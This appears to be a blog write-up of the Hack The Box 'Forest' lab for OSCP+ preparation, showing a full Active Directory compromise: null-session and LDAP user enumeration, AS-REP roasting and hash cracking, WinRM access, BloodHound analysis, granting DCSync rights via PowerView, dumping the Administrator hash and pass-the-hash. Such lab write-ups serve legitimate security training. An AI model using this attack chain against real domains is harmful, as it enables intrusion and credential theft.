---
layout: post
title:  HTB Forest Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-09 01:00:00 +0300
image:  '/images/htb_forest.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Easy, Active-Directory, RPC-Null-Session, LDAP-Anonymous, Username-Pattern, AS-REP-Roasting, BloodHound, PowerView.ps1, ACLs ,GenericAll, WriteDacl, DCSync, Pass-the-Hash]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [RPC Uncredentialed Enumeration](#rpc-uncredentialed-enumeration)
  - [LDAP Uncredentialed Enumeration](#ldap-uncredentialed-enumeration)
- [Foothold](#foothold)
  - [Testing AS-REP Roasting with usernames.txt](#testing-as-rep-roasting-with-usernamestxt)
  - [WinRM access as user svc-alfresco using evil-winrm](#winrm-access-as-user-svc-alfresco-using-evil-winrm)
- [Privilege Escalation](#privilege-escalation)
  - [Enumerating Active Directory Domain with BloodHound](#enumerating-active-directory-domain-with-bloodhound)
  - [Creating a new user and giving DCSync rights abusing WriteDacl](#creating-a-new-user-and-giving-dcsync-rights-abusing-writedacl)
  - [Administrator access with Pass-the-Hash and evil-winrm](#administrator-access-with-pass-the-hash-and-evil-winrm)


# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.129.141.177

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
nmap -A -T4 -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.129.141.177
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 18:35 EST
Nmap scan report for 10.129.141.177
Host is up (0.036s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-08 23:42:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h46m52s, deviation: 4h37m09s, median: 6m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-11-08T15:42:56-08:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-08T23:42:54
|_  start_date: 2024-11-08T23:39:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.33 seconds
```
Examining the results of Nmap, we can find many open ports typical of a Domain Controller.
We will start doing some uncredentialed enumeration.
### RPC Uncredentialed Enumeration
We will try to do some enumeration using rpcclient with a null session:

```shell
rpcclient -U "" -N -c enumdomusers 10.129.141.177
```
It worked! We were able to get usernames:

```shell
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
We can ignore the users starting with HealthMailbox and SM_, these are related to Microsoft Exchange.
We will create a usernames.txt list with the valid ones:

```shell
cat usernames.txt

Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```
### LDAP Uncredentialed Enumeration
We can also do an uncredentialed enumeration on LDAP using ldapsearch:

```shell
ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.129.141.177 | grep userPrincipalName
```
The command above will give us a list of usernames as well:

```shell
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
userPrincipalName: sebastien@htb.local
userPrincipalName: santi@htb.local
userPrincipalName: lucinda@htb.local
userPrincipalName: andy@htb.local
userPrincipalName: mark@htb.local
```
# Foothold
### Testing AS-REP Roasting with usernames.txt
We will use the list with usernames we created to test AS-REP Roasting on each of them:

```shell
impacket-GetNPUsers htb.local/ -usersfile usernames.txt -dc-ip 10.129.141.177
```
We got a successful result with the user svc-alfresco, giving us a hash:

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0619a6549fb42b578b1d4797888ad8d5$c04e2d7424c6d93665ee9339c5e0630427eb6ab42c18eba869db978b3fef8a29c348c5fbbf72c82f18588fe47ed684e4870fb4b19cc08b3b800e5b87190407d5da3eb442c62c9b760e1cadc1065aac79febe2ef6f2139c418ab6d98acd33b037bf8f25c22cc3351ee7b0403456a6c0bd49e73da3b80d51c3a6c53cd46e75183367891c2da909af245fc0593d3776f11e572fe1b06fa68fe19036edf50b220ccaf0a3284ed3f01866ad6a31b9cbb6db8c299ca141ac56f379f6c9971ad177704ffd5522ed2da054d620ad75207049c7abc84a64dadec0a1fb854b841784f178e585b21d65bb7b
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Cracking the hash:

```shell
hashcat -m 18200 -a 0 svc-alfresco_hash.txt /usr/share/wordlists/rockyou.txt
```
We managed to successfully crack the hash of svc-alfresco, giving us the following credentials:

```shell
# Username
svc-alfresco
# Password
s3rvice
```

### WinRM access as user svc-alfresco using evil-winrm
Using the credentials we got for the user svc-alfresco, we were able to get WinRM access using evil-winrm:

```shell
evil-winrm -i 10.129.141.177 -u svc-alfresco -p 's3rvice'
```
### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\svc-alfresco\Desktop\user.txt
```
# Privilege Escalation
### Enumerating Active Directory Domain with BloodHound
We will use the credentials of svc-alfresco and bloodhound-python to collect data about the domain and enumerate it using BloodHound.

First run bloodhound-python with the following command to collect the data:

```shell
bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.141.177 --zip
```
Then start BloodHound and upload the .zip file that bloodhound-python created:

```shell
# Start neo4j
sudo neo4j console

# Start bloodhound
sudo bloodhound
```
In BloodHound GUI, search for the user svc-alfresco@htb.local and on Node Info, click on Reachable High Value Targets.

We will see that the user svc-alfresco is part of the Service Accounts group, which is part of the Privileged IT Accounts, which is also part of Account Operators group.

If we click on Account Operators -> go to Node Info -> click on Reachable High Value Targets, we will also see that Account Operators group has GenericAll rights on Exchange Windows Permissions group, which has WriteDacl on the htb.local domain.

With the WriteDacl rights, we could give a user DCSync access rights, allowing us to dump the domain controller hashes.

Now that we collected enough information, we managed to build a clear attack path following these steps:
1. Create a new user.
2. Add the new user to Exchange Windows Permission group.
3. Add the new user to Remote Management Users to have remote access rights.
4. Use the WriteDacl rights to give the new user DCSync rights.

### Creating a new user and giving DCSync rights abusing WriteDacl
First create the new user:

```shell
net user vorkharium Password123! /add /domain
```
Add the user to Exchange Windows Permissions group:

```shell
net group "Exchange Windows Permissions" vorkharium /add
```
Add the user to Remote Management Users:

```shell
net localgroup "Remote Management Users" vorkharium /add
```
Use NetExec to check if the new user got successfully added:

```shell
nxc smb 10.129.141.177 -u vorkharium -p 'Password123!' -d htb.local 
```
Nice! If you got a "+" sign, everything worked as intended!

Now use PowerView.ps1 to give DCSync rights to the new user:

```shell
# Upload PowerView.ps1 with evil-winrm upload function
*Evil-WinRM* PS C:\Windows\Temp> upload PowerView.ps1

# Enter the following commands to grant the new user DCSync rights
. ./PowerView.ps1
$SecPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\vorkharium', $SecPass)
Add-DomainObjectACL -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity vorkharium -Rights DCSync -Verbose
```
After completing all the previous steps, now we can finally carry out a DCSync attack with our new user, using the -just-dc-user Administrator and -just-dc-ntlm to just get the hash of the Administrator as result:

```shell
impacket-secretsdump vorkharium@10.129.141.177 -just-dc-user Administrator -just-dc-ntlm
```
Nice! We got the hash of the Administrator:

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Cleaning up...
```
### Administrator access with Pass-the-Hash and evil-winrm
Now we can Pass-the-hash to get access as Administrator using evil-winrm:

```shell
evil-winrm -i 10.129.141.177 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```
We are in!

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```